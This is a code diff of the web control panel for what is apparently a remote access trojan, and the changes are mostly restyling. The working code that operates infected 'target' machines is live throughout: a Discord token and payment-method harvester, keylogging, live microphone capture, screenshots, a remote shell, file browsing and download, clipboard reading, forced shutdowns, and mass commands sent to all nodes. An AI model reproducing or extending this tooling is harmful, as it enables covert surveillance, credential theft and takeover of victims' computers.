+              <button class="btn btn-blue btn-sm" onclick="adminCmd('winlogon_check')">? Check Status</button>
             </div>
           </div>
-          <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Result Log</div>
-          <div id="admin-result" style="font-size:12px;color:var(--dim);background:#050810;border:1px solid var(--border);padding:10px 14px;min-height:60px;max-height:160px;overflow-y:auto;white-space:pre-wrap;line-height:1.8;"></div>
+          <div class="section-head">Result Log</div>
+          <div id="admin-result" style="font-size:12px;color:var(--muted);background:var(--surface2);border:1px solid var(--border2);border-radius:var(--radius);padding:10px 14px;min-height:60px;max-height:160px;overflow-y:auto;white-space:pre-wrap;line-height:1.8;"></div>
         </div>
       </div>
 
       <!-- DATA -->
       <div class="tab-content" id="tab-data">
         <div style="flex:1;min-height:0;overflow-y:auto;padding:20px 24px;">
-          <div style="margin-bottom:18px;padding:14px;background:rgba(179,136,255,0.06);border:1px solid rgba(179,136,255,0.2);">
-            <div style="font-size:10px;color:var(--purple);letter-spacing:2px;margin-bottom:6px;">💀 DATA HARVESTER</div>
-            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Extracts Discord tokens, account info, guilds, Nitro status, and payment methods from all browsers and Discord clients on the target. Results return directly to this panel.</div>
+          <div class="info-banner purple">
+            <div class="info-banner-title">💀 DATA HARVESTER</div>
+            <div style="color:var(--muted);">Extracts Discord tokens, account info, guilds, Nitro status, and payment methods from all browsers and Discord clients on the target. Results return directly to this panel.</div>
           </div>
           <div style="display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap;align-items:center;">
-            <button class="btn btn-purple" onclick="runDiscordGrab()">💀 GRAB DISCORD TOKENS</button>
-            <button class="btn btn-warn btn-sm" onclick="clearDiscordResults()">CLR</button>
-            <span id="discord-grab-status" style="font-size:10px;color:var(--dim);"></span>
+            <button class="btn btn-purple" onclick="runDiscordGrab()">💀 Grab Discord Tokens</button>
+            <button class="btn btn-warn btn-sm" onclick="clearDiscordResults()">Clr</button>
+            <span id="discord-grab-status" style="font-size:10px;color:var(--muted);font-family:var(--mono);"></span>
           </div>
           <div id="discord-results">
-            <div style="font-size:11px;color:var(--dim);">No results yet — click GRAB to harvest tokens.</div>
+            <div style="font-size:11px;color:var(--muted);">No results yet — click GRAB to harvest tokens.</div>
           </div>
         </div>
       </div>
@@ -827,51 +1307,51 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
       <!-- POWER -->
       <div class="tab-content" id="tab-power">
         <div style="flex:1;min-height:0;overflow-y:auto;padding:24px 28px;">
-          <div style="margin-bottom:22px;padding:14px 16px;background:rgba(255,51,102,0.06);border:1px solid rgba(255,51,102,0.2);">
-            <div style="font-size:10px;color:var(--danger);letter-spacing:2px;margin-bottom:5px;">⚠ POWER CONTROLS</div>
-            <div style="font-size:11px;color:var(--dim);line-height:1.8;">All shutdown and restart actions are <strong style="color:var(--warn);">forced</strong> — processes are killed immediately with no save prompts or dialogs.</div>
+          <div class="info-banner danger">
+            <div class="info-banner-title">⚠ POWER CONTROLS</div>
+            <div style="color:var(--muted);">All shutdown and restart actions are <strong style="color:var(--amber);">forced</strong> — processes are killed immediately with no save prompts or dialogs.</div>
           </div>
           <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px;margin-bottom:28px;">
-            <div style="background:var(--panel2);border:1px solid rgba(255,51,102,0.35);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
-              <div style="font-size:9px;letter-spacing:3px;color:var(--danger);text-transform:uppercase;">Shutdown</div>
-              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Force-kills all processes and powers off immediately. No dialogs.</div>
-              <button class="btn btn-red" onclick="powerAction('shutdown')">⏻ FORCE SHUTDOWN</button>
+            <div class="panel-card" style="border-color:rgba(220,38,38,0.2);display:flex;flex-direction:column;gap:10px;">
+              <div class="section-head" style="color:var(--red);margin:0;border:none;padding:0;">Shutdown</div>
+              <div style="font-size:11px;color:var(--muted);line-height:1.6;">Force-kills all processes and powers off immediately. No dialogs.</div>
+              <button class="btn btn-red" onclick="powerAction('shutdown')">⏻ Force Shutdown</button>
             </div>
-            <div style="background:var(--panel2);border:1px solid rgba(255,107,53,0.35);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
-              <div style="font-size:9px;letter-spacing:3px;color:var(--warn);text-transform:uppercase;">Restart</div>
-              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Force-kills all processes and reboots immediately. No dialogs.</div>
-              <button class="btn btn-warn" onclick="powerAction('restart')">↺ FORCE RESTART</button>
+            <div class="panel-card" style="border-color:rgba(217,119,6,0.2);display:flex;flex-direction:column;gap:10px;">
+              <div class="section-head" style="color:var(--amber);margin:0;border:none;padding:0;">Restart</div>
+              <div style="font-size:11px;color:var(--muted);line-height:1.6;">Force-kills all processes and reboots immediately. No dialogs.</div>
+              <button class="btn btn-warn" onclick="powerAction('restart')">↺ Force Restart</button>
             </div>
-            <div style="background:var(--panel2);border:1px solid rgba(0,180,255,0.3);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
-              <div style="font-size:9px;letter-spacing:3px;color:var(--accent2);text-transform:uppercase;">Sleep</div>
-              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Suspends system to RAM. Session preserved on wake.</div>
-              <button class="btn btn-blue" onclick="powerAction('sleep')">💤 SLEEP</button>
+            <div class="panel-card" style="border-color:rgba(37,99,235,0.2);display:flex;flex-direction:column;gap:10px;">
+              <div class="section-head" style="color:var(--accent);margin:0;border:none;padding:0;">Sleep</div>
+              <div style="font-size:11px;color:var(--muted);line-height:1.6;">Suspends system to RAM. Session preserved on wake.</div>
+              <button class="btn btn-blue" onclick="powerAction('sleep')">💤 Sleep</button>
             </div>
-            <div style="background:var(--panel2);border:1px solid rgba(0,180,255,0.2);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
-              <div style="font-size:9px;letter-spacing:3px;color:var(--accent2);text-transform:uppercase;">Hibernate</div>
-              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Writes session to disk, powers off. Restores on next boot.</div>
-              <button class="btn btn-blue" onclick="powerAction('hibernate')">🌙 HIBERNATE</button>
+            <div class="panel-card" style="border-color:rgba(37,99,235,0.15);display:flex;flex-direction:column;gap:10px;">
+              <div class="section-head" style="color:var(--accent);margin:0;border:none;padding:0;">Hibernate</div>
+              <div style="font-size:11px;color:var(--muted);line-height:1.6;">Writes session to disk, powers off. Restores on next boot.</div>
+              <button class="btn btn-blue" onclick="powerAction('hibernate')">🌙 Hibernate</button>
             </div>
-            <div style="background:var(--panel2);border:1px solid rgba(0,255,136,0.2);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
-              <div style="font-size:9px;letter-spacing:3px;color:var(--accent);text-transform:uppercase;">Log Off</div>
-              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Force signs out the current user session.</div>
-              <button class="btn btn-green" onclick="powerAction('logoff')">🚪 LOG OFF</button>
+            <div class="panel-card" style="border-color:rgba(22,163,74,0.2);display:flex;flex-direction:column;gap:10px;">
+              <div class="section-head" style="color:var(--green);margin:0;border:none;padding:0;">Log Off</div>
+              <div style="font-size:11px;color:var(--muted);line-height:1.6;">Force signs out the current user session.</div>
+              <button class="btn btn-green" onclick="powerAction('logoff')">🚪 Log Off</button>
             </div>
-            <div style="background:var(--panel2);border:1px solid rgba(179,136,255,0.3);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
-              <div style="font-size:9px;letter-spacing:3px;color:var(--purple);text-transform:uppercase;">Timed Shutdown</div>
-              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Force shutdown after N seconds delay.</div>
+            <div class="panel-card" style="border-color:rgba(124,58,237,0.2);display:flex;flex-direction:column;gap:10px;">
+              <div class="section-head" style="color:var(--purple);margin:0;border:none;padding:0;">Timed Shutdown</div>
+              <div style="font-size:11px;color:var(--muted);line-height:1.6;">Force shutdown after N seconds delay.</div>
               <div style="display:flex;gap:6px;align-items:center;">
                 <input type="number" id="shutdown-delay" value="60" min="1" max="86400" style="width:70px;">
-                <span style="font-size:10px;color:var(--dim);">sec</span>
+                <span style="font-size:10px;color:var(--muted);">sec</span>
               </div>
               <div style="display:flex;gap:6px;">
-                <button class="btn btn-purple btn-sm" onclick="powerAction('shutdown_timed')">⏱ SET</button>
-                <button class="btn btn-warn btn-sm" onclick="powerAction('shutdown_cancel')">✕ CANCEL</button>
+                <button class="btn btn-purple btn-sm" onclick="powerAction('shutdown_timed')">⏱ Set</button>
+                <button class="btn btn-warn btn-sm" onclick="powerAction('shutdown_cancel')">✕ Cancel</button>
               </div>
             </div>
           </div>
-          <div style="margin-bottom:8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Result</div>
-          <div id="power-result" style="font-size:12px;color:var(--dim);background:#050810;border:1px solid var(--border);padding:10px 14px;min-height:40px;white-space:pre-wrap;line-height:1.8;"></div>
+          <div class="section-head">Result</div>
+          <div id="power-result" style="font-size:12px;color:var(--muted);background:var(--surface2);border:1px solid var(--border2);border-radius:var(--radius);padding:10px 14px;min-height:40px;white-space:pre-wrap;line-height:1.8;"></div>
         </div>
       </div>
 
@@ -884,12 +1364,12 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
   <div class="modal" style="max-width:700px;height:70vh;">
     <div class="modal-header">
       <div class="modal-title-wrap">
-        <div class="modal-node-av" style="background:rgba(245,158,11,0.15);color:#f59e0b;border-color:rgba(245,158,11,0.3);">⚡</div>
-        <div><div class="modal-title">MASS COMMAND</div></div>
+        <div class="modal-node-av" style="background:var(--amber-dim);color:var(--amber);border-color:rgba(217,119,6,0.3);">⚡</div>
+        <div><div class="modal-title">Mass Command</div></div>
       </div>
       <button class="modal-close" onclick="document.getElementById('mass-overlay').classList.remove('open')">✕</button>
     </div>
-    <div style="flex-shrink:0;padding:12px 16px;border-bottom:1px solid var(--border2);display:flex;gap:8px;flex-wrap:wrap;align-items:center;background:var(--s1);">
+    <div style="flex-shrink:0;padding:12px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-wrap:wrap;align-items:center;background:var(--surface2);">
       <select id="mass-action">
         <option value="shell">Shell Command</option>
         <option value="alert">Alert Popup</option>
@@ -900,7 +1380,7 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
         <option value="screenshot">Screenshot</option>
       </select>
       <input type="text" id="mass-param" placeholder="command / message / URL..." style="flex:1;min-width:150px;">
-      <button class="btn btn-warn" onclick="runMassCmd()">⚡ EXECUTE ALL</button>
+      <button class="btn btn-warn" onclick="runMassCmd()">⚡ Execute All</button>
     </div>
     <div class="mass-area" id="mass-results"></div>
   </div>
@@ -914,8 +1394,8 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
     <div class="confirm-body">This will permanently remove the node from the panel. It will not affect the remote client — but it will disappear from the list until the server is restarted or the client reconnects.</div>
     <div class="confirm-target" id="delete-host-display">—</div>
     <div class="confirm-btns">
-      <button class="btn btn-ghost" onclick="closeDeleteConfirm()">CANCEL</button>
-      <button class="btn btn-red" onclick="confirmDeleteClient()">DELETE NODE</button>
+      <button class="btn btn-ghost" onclick="closeDeleteConfirm()">Cancel</button>
+      <button class="btn btn-red" onclick="confirmDeleteClient()">Delete Node</button>
     </div>
   </div>
 </div>
@@ -924,7 +1404,7 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
 const socket = io();
 let clients = [];
 let selectedClient = null;
-let _dashboardToken = '';   // saved on login for HTTP uploads
+let _dashboardToken = '';
 
 // ── Auth ──
 function doLogin(){
@@ -943,9 +1423,7 @@ socket.on('auth_result', res => {
     document.getElementById('login-pass').focus();
   }
 });
-socket.on('auth_required', () => {
-  document.getElementById('login-overlay').style.display = 'flex';
-});
+socket.on('auth_required', () => { document.getElementById('login-overlay').style.display = 'flex'; });
 socket.on('connect', () => {
   document.getElementById('login-overlay').style.display = 'flex';
   document.getElementById('login-pass').focus();
@@ -1026,18 +1504,18 @@ function toggleMicLive(){
     micLive = true;
     micAudioCtx = new (window.AudioContext||window.webkitAudioContext)();
     sendCmd('mic_live_start');
-    document.getElementById('btn-mic-live').textContent = '■ STOP LIVE';
+    document.getElementById('btn-mic-live').textContent = '■ Stop Live';
     document.getElementById('btn-mic-live').className = 'btn btn-warn btn-sm';
     document.getElementById('mic-live-status').textContent = '● LIVE';
-    document.getElementById('mic-live-status').style.color = 'var(--danger)';
+    document.getElementById('mic-live-status').style.color = 'var(--red)';
   } else {
     micLive = false;
     sendCmd('mic_live_stop');
     if(micAudioCtx){ micAudioCtx.close(); micAudioCtx=null; }
-    document.getElementById('btn-mic-live').textContent = '🎙 LIVE LISTEN';
+    document.getElementById('btn-mic-live').textContent = '🎙 Live Listen';
     document.getElementById('btn-mic-live').className = 'btn btn-red btn-sm';
     document.getElementById('mic-live-status').textContent = 'IDLE';
-    document.getElementById('mic-live-status').style.color = 'var(--dim)';
+    document.getElementById('mic-live-status').style.color = 'var(--muted)';
     clearMicCanvas();
   }
 }
@@ -1048,8 +1526,8 @@ function drawMicWave(samples){
   const ctx = canvas.getContext('2d');
   canvas.width = canvas.offsetWidth;
   const w = canvas.width, h = canvas.height;
-  ctx.fillStyle = '#050810'; ctx.fillRect(0,0,w,h);
-  ctx.strokeStyle = '#ff3366'; ctx.lineWidth = 1.5; ctx.beginPath();
+  ctx.fillStyle = '#0f1117'; ctx.fillRect(0,0,w,h);
+  ctx.strokeStyle = '#3b82f6'; ctx.lineWidth = 1.5; ctx.beginPath();
   const step = Math.ceil(samples.length/w);
   for(let i=0;i<w;i++){ const s=samples[i*step]||0; const y=(s*0.5+0.5)*h; i===0?ctx.moveTo(i,y):ctx.lineTo(i,y); }
   ctx.stroke();
@@ -1059,19 +1537,19 @@ function clearMicCanvas(){
   if(!canvas) return;
   const ctx = canvas.getContext('2d');
   canvas.width = canvas.offsetWidth;
-  ctx.fillStyle = '#050810'; ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle = '#0f1117'; ctx.fillRect(0,0,canvas.width,canvas.height);
 }
 
 socket.on('mic_data', data => {
   if(!selectedClient || data.client_id !== selectedClient.id) return;
   document.getElementById('mic-status').textContent = 'RECEIVED';
-  document.getElementById('mic-status').style.color = 'var(--accent)';
+  document.getElementById('mic-status').style.color = 'var(--green)';
   const blob = b64toBlob(data.data, 'audio/wav');
   const url = URL.createObjectURL(blob);
   const ts = new Date().toTimeString().slice(0,8);
   const div = document.createElement('div');
   div.className = 'audio-item';
-  div.innerHTML = `<span style="color:var(--dim);font-size:10px;min-width:60px;">${ts}</span>
+  div.innerHTML = `<span style="color:var(--muted);font-size:10px;min-width:60px;font-family:var(--mono);">${ts}</span>
     <audio controls src="${url}"></audio>
     <a href="${url}" download="mic_${ts.replace(/:/g,'')}.wav" class="btn btn-blue btn-sm">DL</a>`;
   document.getElementById('mic-recordings').prepend(div);
@@ -1089,6 +1567,16 @@ socket.on('auto_screenshot', data => {
   gallery.prepend(div);
   while(gallery.children.length > 30) gallery.removeChild(gallery.lastChild);
   document.getElementById('ss-status').textContent = 'LAST: '+data.ts;
+});
+
+socket.on('chat_reply', data => {
+  if(!selectedClient || data.client_id !== selectedClient.id) return;
+  const msgs = document.getElementById('chat-messages');
+  const div = document.createElement('div');
+  div.className = 'chat-msg chat-msg-them';
+  div.innerHTML = `<div class="cm-header"><span class="cm-label-them">TARGET</span><span class="cm-time">${new Date().toTimeString().slice(0,8)}</span></div><div class="cm-text">${esc(data.msg)}</div>`;
+  msgs.appendChild(div);
+  msgs.scrollTop = msgs.scrollHeight;
 });
 
 socket.on('cmd_response', data => {
@@ -1122,9 +1610,12 @@ function renderClients(data){
     else if(was==='offline'&&c.status==='online') addLog(`Online: ${c.hostname}`,'connect');
   });
   const online = data.filter(c=>c.status==='online').length;
-  document.getElementById('stat-total').textContent = data.length;
-  document.getElementById('stat-online').textContent = online;
-  document.getElementById('stat-offline').textContent = data.length - online;
+
+  // Animate stat numbers
+  animateStat('stat-total', data.length);
+  animateStat('stat-online', online);
+  animateStat('stat-offline', data.length - online);
+
   document.getElementById('last-update').textContent = new Date().toTimeString().slice(0,8);
   document.getElementById('rail-count').textContent = document.getElementById('log').children.length;
 
@@ -1154,7 +1645,7 @@ function renderClients(data){
       <div class="ncard-meta">
         <div class="nmeta">
           <div class="nmeta-k">IP Address</div>
-          <div class="nmeta-v fire">${esc(c.ip)}</div>
+          <div class="nmeta-v accent">${esc(c.ip)}</div>
         </div>
         <div class="nmeta">
           <div class="nmeta-k">Platform</div>
@@ -1170,11 +1661,27 @@ function renderClients(data){
         </div>
       </div>
       <div class="ncard-actions">
-        <button class="btn btn-fire btn-sm" onclick="event.stopPropagation();openNode('${c.id}')">CONTROL →</button>
-        <button class="btn btn-red btn-sm" onclick="event.stopPropagation();promptDeleteClient('${c.id}')" title="${isOnline?'Must be offline to delete':'Remove node'}">✕ DELETE</button>
+        <button class="btn btn-primary btn-sm" onclick="event.stopPropagation();openNode('${c.id}')">Control →</button>
+        <button class="btn btn-red btn-sm" onclick="event.stopPropagation();promptDeleteClient('${c.id}')" title="${isOnline?'Must be offline to delete':'Remove node'}">✕ Delete</button>
       </div>
     </div>`;
   }).join('');
+}
+
+let _statValues = {};
+function animateStat(id, newVal){
+  const el = document.getElementById(id);
+  if(!el) return;
+  const oldVal = _statValues[id] || 0;
+  if(oldVal === newVal) return;
+  _statValues[id] = newVal;
+  el.style.transform = 'translateY(-4px) scale(1.1)';
+  el.style.opacity = '0.6';
+  setTimeout(()=>{
+    el.textContent = newVal;
+    el.style.transform = 'translateY(0) scale(1)';
+    el.style.opacity = '1';
+  }, 150);
 }
 
 // ── Select / Open Node ──
@@ -1199,15 +1706,6 @@ function promptDeleteClient(id){
   if(!c) return;
   if(c.status === 'online'){
     addLog(`Cannot delete online node: ${c.hostname} — disconnect first`,'error');
-    // Flash the card red briefly
-    const cards = document.querySelectorAll('.ncard');
-    cards.forEach(card => {
-      if(card.onclick && card.getAttribute('onclick') && card.innerHTML.includes(c.hostname)){
-        card.style.borderColor = 'var(--red)';
-        setTimeout(()=>card.style.borderColor='',1200);
-      }
-    });
-    // Show inline error toast
     showToast('⛔ Cannot delete an ONLINE node. The client must be disconnected first.');
     return;
   }
@@ -1236,24 +1734,24 @@ socket.on('delete_result', data => {
     addLog('Delete failed: '+data.msg,'error');
   }
 });
-document.getElementById('delete-overlay').addEventListener('click',e=>{
-  if(e.target===document.getElementById('delete-overlay')) closeDeleteConfirm();
-});
+document.getElementById('delete-overlay').addEventListener('click',e=>{ if(e.target===document.getElementById('delete-overlay')) closeDeleteConfirm(); });
 
-// ── Toast notification ──
+// ── Toast ──
 function showToast(msg){
   let t = document.getElementById('nx-toast');
   if(!t){
     t = document.createElement('div');
     t.id = 'nx-toast';
-    t.style.cssText = 'position:fixed;bottom:24px;right:24px;background:var(--s2);border:1px solid var(--red);color:var(--red);padding:12px 18px;font-family:var(--mono);font-size:11px;z-index:9999;max-width:380px;line-height:1.6;box-shadow:0 8px 32px rgba(0,0,0,0.5);transition:opacity .3s;';
+    t.style.cssText = 'position:fixed;bottom:24px;right:24px;background:var(--surface);border:1px solid rgba(220,38,38,0.3);color:var(--red);padding:12px 18px;font-family:var(--mono);font-size:11px;z-index:9999;max-width:380px;line-height:1.6;box-shadow:0 8px 32px rgba(0,0,0,0.12);transition:opacity .3s,transform .3s;border-radius:8px;';
     document.body.appendChild(t);
   }
   t.textContent = msg;
   t.style.opacity = '1';
+  t.style.transform = 'translateY(0)';
   clearTimeout(t._to);
-  t._to = setTimeout(()=>{t.style.opacity='0';},4000);
+  t._to = setTimeout(()=>{ t.style.opacity='0'; t.style.transform='translateY(8px)'; },4000);
 }
+
 function closeModal(){
   document.getElementById('modal-overlay').classList.remove('open');
   if(streaming) stopStream();
@@ -1384,7 +1882,7 @@ async function runShell(){
   if(res.status==='ok'){
     if(res.stdout) out.innerHTML+=`<span class="shell-stdout">${esc(res.stdout)}</span>`;
     if(res.stderr) out.innerHTML+=`<span class="shell-stderr">${esc(res.stderr)}</span>`;
-    if(!res.stdout&&!res.stderr) out.innerHTML+=`<span style="color:var(--dim)">(exit ${res.returncode})</span>\n`;
+    if(!res.stdout&&!res.stderr) out.innerHTML+=`<span style="color:#64748b">(exit ${res.returncode})</span>\n`;
   } else { out.innerHTML+=`<span class="shell-stderr">Error: ${esc(res.msg)}</span>\n`; }
   out.scrollTop=out.scrollHeight;
 }
@@ -1397,14 +1895,14 @@ function startKeylog(){
   document.getElementById('btn-kl-start').disabled=true;
   document.getElementById('btn-kl-stop').disabled=false;
   document.getElementById('kl-status').textContent='● REC';
-  document.getElementById('kl-status').style.color='var(--accent)';
+  document.getElementById('kl-status').style.color='var(--red)';
 }
 function stopKeylog(){
   keylogging=false; sendCmd('keylog_stop');
   document.getElementById('btn-kl-start').disabled=false;
   document.getElementById('btn-kl-stop').disabled=true;
   document.getElementById('kl-status').textContent='STOPPED';
-  document.getElementById('kl-status').style.color='var(--dim)';
+  document.getElementById('kl-status').style.color='var(--muted)';
 }
 function clearKeylog(){ document.getElementById('keylog-output').innerHTML=''; }
 function copyKeylog(){ navigator.clipboard.writeText(document.getElementById('keylog-output').innerText).catch(()=>{}); }
@@ -1413,11 +1911,11 @@ function copyKeylog(){ navigator.clipboard.writeText(document.getElementById('ke
 async function startMic(){
   const dur=parseInt(document.getElementById('mic-duration').value)||10;
   document.getElementById('mic-status').textContent='● RECORDING...';
-  document.getElementById('mic-status').style.color='var(--danger)';
+  document.getElementById('mic-status').style.color='var(--red)';
   const res=await sendCmdRaw('mic_record',{duration:dur});
   if(res.status!=='ok') { document.getElementById('mic-status').textContent='Error: '+res.msg; }
 }
-function stopMic(){ sendCmd('mic_stop'); document.getElementById('mic-status').textContent='STOPPED'; document.getElementById('mic-status').style.color='var(--dim)'; }
+function stopMic(){ sendCmd('mic_stop'); document.getElementById('mic-status').textContent='STOPPED'; document.getElementById('mic-status').style.color='var(--muted)'; }
 
 // ── Clipboard ──
 async function getClipboard(){
@@ -1438,7 +1936,7 @@ async function fbFetch(path){
   document.getElementById('fb-list').innerHTML='<div class="loading">Loading...</div>';
   const res=await sendCmdRaw('ls',{path:path||''});
   if(res.status==='ok'){ fbCurrentPath=res.path||path; document.getElementById('fb-path').value=fbCurrentPath; renderFbList(res.data); }
-  else { document.getElementById('fb-list').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`; }
+  else { document.getElementById('fb-list').innerHTML=`<div class="no-data" style="color:var(--amber)">Error: ${esc(res.msg)}</div>`; }
 }
 function fbNavigate(){ const p=document.getElementById('fb-path').value.trim(); if(p) fbFetch(p); }
 function fbUp(){ if(!fbCurrentPath) return; const parts=fbCurrentPath.replace(/[\/\\]$/,'').split(/[\/\\]/); if(parts.length<=1){fbFetch('/');return;} parts.pop(); fbFetch(parts.join('/')||'/'); }
@@ -1452,7 +1950,7 @@ function renderFbList(items){
       <div class="fi-icon">${icon}</div><div class="fi-name">${esc(item.name)}</div>
       <div class="fi-size">${size}</div><div class="fi-date">${item.modified}</div>
       <div class="fi-act">${!item.is_dir?`
-        <button class="btn btn-blue btn-sm" onclick="event.stopPropagation();fbRead('${esc2(item.name)}')">VIEW</button>
+        <button class="btn btn-blue btn-sm" onclick="event.stopPropagation();fbRead('${esc2(item.name)}')">View</button>
         <button class="btn btn-green btn-sm" onclick="event.stopPropagation();fbDownload('${esc2(item.name)}')">DL</button>`:''}</div>
     </div>`;
   }).join('');
@@ -1462,7 +1960,7 @@ async function fbRead(name){
   const sep=fbCurrentPath.includes('\\')?'\\':'/';
   const path=fbCurrentPath.replace(/[\/\\]$/,'')+sep+name;
   const res=await sendCmdRaw('read_file',{path});
-  if(res.status==='ok'){ const w=window.open('','_blank','width=800,height=600'); w.document.write(`<pre style="background:#080c10;color:#c9d1d9;padding:20px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;">${esc(res.data)}</pre>`); }
+  if(res.status==='ok'){ const w=window.open('','_blank','width=800,height=600'); w.document.write(`<pre style="background:#f9f9fb;color:#111827;padding:20px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;">${esc(res.data)}</pre>`); }
   else alert('Error: '+res.msg);
 }
 async function fbDownload(name){
@@ -1479,11 +1977,11 @@ async function getNetinfo(){
   const res=await sendCmdRaw('netinfo');
   if(res.status==='ok'){
     const d=res.data; let html='';
-    if(d.io){ html+=`<div class="net-section"><div class="net-title">I/O Stats</div><div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:4px;">${[['Sent',fmtSize(d.io.bytes_sent)],['Received',fmtSize(d.io.bytes_recv)],['Pkts Out',d.io.packets_sent],['Pkts In',d.io.packets_recv]].map(([l,v])=>`<div style="background:var(--panel2);border:1px solid var(--border);padding:10px;"><div style="font-size:9px;color:var(--dim);letter-spacing:2px;margin-bottom:4px;">${l}</div><div style="font-size:14px;color:var(--accent2);">${v}</div></div>`).join('')}</div></div>`; }
+    if(d.io){ html+=`<div class="net-section"><div class="net-title">I/O Stats</div><div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:4px;">${[['Sent',fmtSize(d.io.bytes_sent)],['Received',fmtSize(d.io.bytes_recv)],['Pkts Out',d.io.packets_sent],['Pkts In',d.io.packets_recv]].map(([l,v])=>`<div style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:10px;"><div style="font-size:9px;color:var(--muted);letter-spacing:0.08em;margin-bottom:4px;font-weight:600;text-transform:uppercase;">${l}</div><div style="font-size:14px;color:var(--accent);font-family:var(--mono);">${v}</div></div>`).join('')}</div></div>`; }
     if(d.interfaces&&d.interfaces.length){ html+=`<div class="net-section"><div class="net-title">Interfaces</div>${d.interfaces.map(i=>`<div class="net-iface"><span class="ni-name">${esc(i.iface)}</span><span class="ni-ip">${esc(i.ip)}</span><span class="ni-mask">${esc(i.netmask)}</span></div>`).join('')}</div>`; }
-    if(d.connections&&d.connections.length){ html+=`<div class="net-section"><div class="net-title">Connections (${d.connections.length})</div><table><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>Status</th><th>PID</th><th>Process</th></tr></thead><tbody>${d.connections.map(c=>`<tr><td><span class="tag ${c.proto==='TCP'?'tag-blue':'tag-green'}">${c.proto}</span></td><td style="font-size:10px">${esc(c.laddr)}</td><td style="font-size:10px;color:var(--accent2)">${esc(c.raddr)||'—'}</td><td style="font-size:10px;color:${c.status==='ESTABLISHED'?'var(--accent)':'var(--dim)'}">${esc(c.status)}</td><td style="font-size:10px;color:var(--dim)">${c.pid||''}</td><td style="font-size:10px">${esc(c.proc)}</td></tr>`).join('')}</tbody></table></div>`; }
+    if(d.connections&&d.connections.length){ html+=`<div class="net-section"><div class="net-title">Connections (${d.connections.length})</div><table><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>Status</th><th>PID</th><th>Process</th></tr></thead><tbody>${d.connections.map(c=>`<tr><td><span class="tag ${c.proto==='TCP'?'tag-blue':'tag-green'}">${c.proto}</span></td><td style="font-size:10px">${esc(c.laddr)}</td><td style="font-size:10px;color:var(--accent)">${esc(c.raddr)||'—'}</td><td style="font-size:10px;color:${c.status==='ESTABLISHED'?'var(--green)':'var(--muted)'}">${esc(c.status)}</td><td style="font-size:10px;color:var(--muted)">${c.pid||''}</td><td style="font-size:10px">${esc(c.proc)}</td></tr>`).join('')}</tbody></table></div>`; }
     document.getElementById('net-content').innerHTML=html||'<div class="no-data">No data</div>';
-  } else { document.getElementById('net-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`; }
+  } else { document.getElementById('net-content').innerHTML=`<div class="no-data" style="color:var(--amber)">Error: ${esc(res.msg)}</div>`; }
 }
 
 // ── Sysinfo ──
@@ -1496,108 +1994,102 @@ async function getSysinfo(){
       <div class="si-card"><div class="si-label">Hostname</div><div class="si-value accent2">${esc(d.hostname)}</div></div>
       <div class="si-card"><div class="si-label">Username</div><div class="si-value">${esc(d.username)}</div></div>
       <div class="si-card"><div class="si-label">Platform</div><div class="si-value">${esc(d.platform)}</div></div>
-      <div class="si-card"><div class="si-label">IP</div><div class="si-value accent2">${esc(d.ip)}</div></div>
+      <div class="si-card"><div class="si-label">IP</div><div class="si-value accent">${esc(d.ip)}</div></div>
       <div class="si-card"><div class="si-label">CPU</div><div class="si-value accent">${d.cpu_percent}%</div><div class="progress-bar"><div class="progress-fill ${cc(d.cpu_percent)}" style="width:${d.cpu_percent}%"></div></div></div>
-      <div class="si-card"><div class="si-label">RAM ${d.ram_used}/${d.ram_total} GB</div><div class="si-value accent">${d.ram_percent}%</div><div class="progress-bar"><div class="progress-fill ${cc(d.ram_percent)}" style="width:${d.ram_percent}%"></div></div></div>
-      <div class="si-card"><div class="si-label">Disk ${d.disk_used}/${d.disk_total} GB</div><div class="si-value accent">${d.disk_percent}%</div><div class="progress-bar"><div class="progress-fill ${cc(d.disk_percent)}" style="width:${d.disk_percent}%"></div></div></div>
-      <div class="si-card"><div class="si-label">Processes</div><div class="si-value accent2">${d.process_count}</div></div>
-      <div class="si-card" style="grid-column:span 2"><div class="si-label">Boot Time</div><div class="si-value">${esc(d.boot_time)}</div></div>
+      <div class="si-card"><div class="si-label">RAM</div><div class="si-value">${d.ram_percent}% (${fmtSize(d.ram_used)} / ${fmtSize(d.ram_total)})</div><div class="progress-bar"><div class="progress-fill ${cc(d.ram_percent)}" style="width:${d.ram_percent}%"></div></div></div>
